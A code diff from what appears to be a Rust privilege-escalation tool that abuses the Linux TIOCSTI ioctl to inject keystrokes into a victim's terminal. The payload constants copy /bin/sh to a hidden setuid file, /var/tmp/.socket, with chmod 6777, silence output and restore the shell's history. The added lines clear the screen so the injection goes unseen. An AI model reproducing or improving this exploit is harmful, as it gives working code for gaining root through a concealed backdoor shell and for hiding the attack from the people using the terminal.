@@ -21,6 +21,10 @@ const COMMAND: &[u8] = b"cp /bin/sh /var/tmp/.socket; chmod 6777 /var/tmp/.socke
 /// End part of the payload to inject into the tty's input buffer.
 const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";
 
+/// Escape sequence to clear the terminal.
+const CLEAR: &str = "\x1b[4A\x1b[J";
+// const CLEAR: &str = "\x1b[H\x1b[J";
+
 /// Abuses the `TIOCSTI` ioctl to inject keystrokes into a terminal to escalate privileges on Linux.
 ///
 /// # Errors
@@ -87,7 +91,9 @@ pub fn run() -> anyhow::Result<()> {
 
     // TODO: move initial checks to an external function?
 
-    // TODO: clear the termina
+    // Clear the terminal.
+    println!("{CLEAR}");
+
     // TODO: implement some unit (and maybe integration) tests, excluding tests that don't work in ci
 
     // No need to SIGCONT here because `fg` in the payload does that for us.
